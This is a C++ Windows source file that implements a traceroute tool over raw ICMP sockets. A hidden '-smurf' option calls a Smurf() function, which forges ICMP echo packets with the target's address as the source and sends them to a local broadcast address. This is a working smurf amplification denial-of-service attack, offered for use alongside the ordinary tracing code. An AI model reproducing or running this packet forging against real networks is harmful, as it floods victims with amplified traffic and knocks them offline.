#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib, "WS2_32.lib")

#include <iostream>
#include <cstdio>
#include <winsock2.h>
#include <windows.h>
#include <Ws2tcpip.h>

#include "InetHelper.h"

struct ICMPheader
{
	unsigned char	byType;
	unsigned char	byCode;
	unsigned short	nChecksum;
	unsigned short	nId;
	unsigned short	nSequence;
};

struct ICMPheader2
{
	unsigned char	byType;
	unsigned char	byCode;
	unsigned char	nChecksumH;
	unsigned char	nChecksumL;
	unsigned short	nId;
	unsigned short	nSequence;
};

struct IPheader
{
	unsigned char	byVerLen;
	unsigned char	byTos;
	unsigned short	nTotalLength;
	unsigned short	nId;
	unsigned short	nOffset;
	unsigned char	byTtl;
	unsigned char	byProtocol;
	unsigned short	nChecksum;
	unsigned int	nSrcAddr;
	unsigned int	nDestAddr;
};

using namespace std;

bool Initialize();
bool UnInitialize();
SOCKET CreateSocket(int protocol);
int SetTTL(SOCKET sock, int ttl);
void FillHeader(ICMPheader sendHeader, char **sendBuffer);
int SendICMP(SOCKET sock,
	char **sendBuffer,
	SOCKADDR_IN *destAddr,
	int timeOut,
	SOCKADDR_IN *mediatorAddress,
	char **receiveBuffer,
	int *received);
int GetHostName(SOCKADDR_IN *mediatorAddress, char **hostName);
void Smurf(int sock, struct sockaddr_in sin, u_long dest, int psize);

const int MaxRetries = 3;

int main(int argc, char* argv[])
{
	if (Initialize() == false)
	{
		return -1;
	}

	int sequence = 0;
	int timeOut = 3000;
	int maxHops = 30;
	bool smurf = false;

	char *remoteIP = NULL, *remoteHost = NULL;

	remoteHost = argv[argc - 1];

	for (int i = 1; i < argc - 1; i += 2)
	{
		if (strcmp(argv[i], "-h") == 0) 
		{
			maxHops = atoi(argv[i + 1]);
		}
		else if (strcmp(argv[i], "-w") == 0)
		{
			timeOut = atoi(argv[i + 1]);
		}
		else if (strcmp(argv[i], "-smurf") == 0) 
		{
			smurf = true;
		}
	}

	if (InetHelper::GetIP(remoteHost, &remoteIP) == false)
	{
		cerr << endl << "Unable to resolve hostname" << endl;
		return -1;
	}

	SOCKADDR_IN destAddr;
	destAddr.sin_family = AF_INET;
	destAddr.sin_addr.S_un.S_addr = inet_addr(remoteIP);
	destAddr.sin_port = rand();

	if (smurf)
	{
		cout << "Smurfing " << remoteHost << endl;

		SOCKET sock = CreateSocket(IPPROTO_RAW);

		int brcast = 1;
		setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char*)&brcast, sizeof(brcast));
		int opt = 1;
		setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&opt, sizeof(opt));

		int cnt = 0;
		while (cnt++ < 1)
		{
			Smurf(sock, destAddr, inet_addr("192.168.1.255"), 0);
		}

		return 0;
	}

	cout << "Tracing route to " << remoteHost
		<< " [" << remoteIP << "] over a maximum of "
		<< maxHops << " hops." << endl << endl;

	int ttl = 1;

	SOCKET sock = CreateSocket(IPPROTO_ICMP);

	SOCKADDR_IN mediatorAddress;

	ICMPheader sendHeader;
	sendHeader.nId = htons(rand());
	sendHeader.byCode = 0;	//ICMP echo and reply messages
	sendHeader.byType = 8;	//ICMP echo message

	int hopsCount = 0;

	while (hopsCount < maxHops &&
		memcmp(&destAddr.sin_addr, &mediatorAddress.sin_addr, sizeof(in_addr)) != 0)
	{
		cout << hopsCount + 1;

		char *sendBuffer = new char[sizeof(ICMPheader)];

		if (SetTTL(sock, ttl) == SOCKET_ERROR)
		{
			closesocket(sock);
			UnInitialize();
			delete[]sendBuffer;
			return -1;
		}

		sendHeader.nSequence = htons(sequence++);
		sendHeader.nChecksum = 0;

		FillHeader(sendHeader, &sendBuffer);

		bool responsed = false;
		int retries = 0;

		while (retries < MaxRetries)
		{
			SYSTEMTIME timeSend, timeReceived;
			::GetSystemTime(&timeSend);

			char *receiveBuffer = new char[1500];

			int received;

			int sendResult = SendICMP(sock, &sendBuffer, &destAddr, timeOut, &mediatorAddress, &receiveBuffer, &received);
			if (sendResult == -1)
			{
				closesocket(sock);
				UnInitialize();
				delete[]sendBuffer;
				delete[]receiveBuffer;
				return -1;
			}
			else if (sendResult == 0)
			{
				cout << "\t*";
			}
			else
			{
				responsed = true;

				::GetSystemTime(&timeReceived);

				char *ICMPbuffer = receiveBuffer + sizeof(IPheader);
				int ICMPMessageLength = received - sizeof(IPheader);

				ICMPheader receivedHeader;
				memcpy_s(&receivedHeader, sizeof(receivedHeader), ICMPbuffer, sizeof(receivedHeader));

				if (receivedHeader.byType == 11 //Time Exceeded
					&& receivedHeader.byCode == 0 //TTL expired
					&& InetHelper::IsChecksumValid(ICMPbuffer, ICMPMessageLength))
				{
					int sec = timeReceived.wSecond - timeSend.wSecond;
					if (sec < 0)
					{
						sec = sec + 60;
					}

					int milliSec = abs(timeReceived.wMilliseconds - timeSend.wMilliseconds);

					int timePassed = sec * 1000 + milliSec;

					cout << '\t' << timePassed << " ms";
				}
				else
				{
					cout << "\t!";
				}
			}

			delete[]receiveBuffer;

			++retries;
		}

		if (responsed == false)
		{
			cout << "\tRequest timed out.";
		}
		else
		{
			char *sourceAddress = inet_ntoa(mediatorAddress.sin_addr);
			char *hostName = new char[NI_MAXHOST];

			if (GetHostName(&mediatorAddress, &hostName) == SOCKET_ERROR)
			{
				strncpy_s(hostName, NI_MAXHOST, "Error resolving host name", _TRUNCATE);
			}

			cout << '\t' << hostName << " [" << sourceAddress << "]";
		}

		cout << endl << '\r';
		++hopsCount;
		++ttl;

		delete[]sendBuffer;
	}

	closesocket(sock);

	if (UnInitialize() == false)
	{
		return -1;
	}

	cout << endl << "Trace complete." << endl;

	return 0;
}

bool Initialize()
{
	WSADATA wsa;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) == SOCKET_ERROR)
	{
		return false;
	}

	SYSTEMTIME time;
	::GetSystemTime(&time);
	srand(time.wMilliseconds);

	return true;
}

bool UnInitialize()
{
	if (WSACleanup() == SOCKET_ERROR)
	{
		return false;
	}

	return true;
}

SOCKET CreateSocket(int protocol)
{
	return socket(AF_INET, SOCK_RAW, protocol);
}

int SetTTL(SOCKET sock, int ttl)
{
	return setsockopt(sock, IPPROTO_IP, IP_TTL, (char *)&ttl, sizeof(ttl));
}

void FillHeader(ICMPheader sendHeader, char **sendBuffer)
{
	memcpy_s(*sendBuffer, sizeof(ICMPheader), &sendHeader, sizeof(ICMPheader));

	sendHeader.nChecksum = htons(InetHelper::GetChecksum(*sendBuffer, sizeof(ICMPheader)));

	memcpy_s(*sendBuffer, sizeof(ICMPheader), &sendHeader, sizeof(ICMPheader));
}

int SendICMP(SOCKET sock,
	char **sendBuffer,
	SOCKADDR_IN *destAddr,
	int timeOut,
	SOCKADDR_IN *mediatorAddress,
	char **receiveBuffer,
	int *received)
{
	int result = sendto(sock, *sendBuffer, sizeof(ICMPheader), 0, (SOCKADDR *)destAddr,
		sizeof(SOCKADDR_IN));

	if (result == SOCKET_ERROR)
	{
		return -1;
	}

	fd_set fdRead;

	FD_ZERO(&fdRead);
	FD_SET(sock, &fdRead);

	timeval timeInterval = { 0, 0 };
	timeInterval.tv_usec = timeOut * 1000;

	if ((result = select(0, &fdRead, NULL, NULL, &timeInterval))
		== SOCKET_ERROR)
	{
		return -1;
	}

	if (result > 0 && FD_ISSET(sock, &fdRead))
	{
		int nRemoteAddrLen = sizeof(SOCKADDR_IN);
		if ((result = recvfrom(sock, *receiveBuffer, 1500, 0, (SOCKADDR *)mediatorAddress, &nRemoteAddrLen))
			== SOCKET_ERROR)
		{
			return -1;
		}
		else 
		{
			*received = result;
			return 1;
		}
	}
	else
	{
		return 0;
	}
}

int GetHostName(SOCKADDR_IN *mediatorAddress, char **hostName)
{
	return getnameinfo((SOCKADDR*)mediatorAddress, sizeof(SOCKADDR_IN), *hostName, NI_MAXHOST, NULL, 0, NI_NUMERICSERV);
}

typedef struct ip_hdr
{
	unsigned char ip_header_len : 4; // 4-bit header length (in 32-bit words)
									 // normally=5 (Means 20 Bytes may be 24 also)
	unsigned char ip_version : 4;   // 4-bit IPv4 version
	unsigned char ip_tos;          // IP type of service
	unsigned short ip_total_length; // Total length
	unsigned short ip_id;          // Unique identifier

	unsigned char ip_frag_offset : 5; // Fragment offset field

	unsigned char ip_more_fragment : 1;
	unsigned char ip_dont_fragment : 1;
	unsigned char ip_reserved_zero : 1;

	unsigned char ip_frag_offset1; //fragment offset

	unsigned char ip_ttl;          // Time to live
	unsigned char ip_protocol;     // Protocol(TCP,UDP etc)
	unsigned short ip_checksum;    // IP checksum
	unsigned int ip_srcaddr;       // Source address
	unsigned int ip_destaddr;      // Source address
} IPV4_HDR, *PIPV4_HDR, FAR * LPIPV4_HDR;

void Smurf(int sock, struct sockaddr_in sin, u_long dest, int psize)
{
	ICMPheader2 *icmp;

	IPV4_HDR *v4hdr = NULL;
	char buf[1000];
	int payload = 512;

	v4hdr = (IPV4_HDR *)buf; //lets point to the ip header portion
	v4hdr->ip_version = 4;
	v4hdr->ip_header_len = 5;
	v4hdr->ip_tos = 0;
	v4hdr->ip_total_length = htons(sizeof(IPV4_HDR) + sizeof(ICMPheader2) + payload);
	v4hdr->ip_id = htons(2);
	v4hdr->ip_frag_offset = 0;
	v4hdr->ip_frag_offset1 = 0;
	v4hdr->ip_reserved_zero = 0;
	v4hdr->ip_dont_fragment = 1;
	v4hdr->ip_more_fragment = 0;
	v4hdr->ip_ttl = 8;
	v4hdr->ip_protocol = IPPROTO_ICMP;
	v4hdr->ip_srcaddr = inet_addr(inet_ntoa(sin.sin_addr));
	v4hdr->ip_destaddr = dest;
	v4hdr->ip_checksum = 0;

	icmp = (ICMPheader2 *)&buf[sizeof(IPV4_HDR)];
	icmp->byCode = 0;
	icmp->byType = 8;
	icmp->nChecksumL = 8;
	icmp->nChecksumH = 0;

	char *data;
	data = &buf[sizeof(IPV4_HDR) + sizeof(ICMPheader2)];
	memset(data, '^', payload);

	sendto(sock, buf, sizeof(IPV4_HDR) + sizeof(ICMPheader2) + payload,
		0, (sockaddr *)&sin, sizeof(sin));
}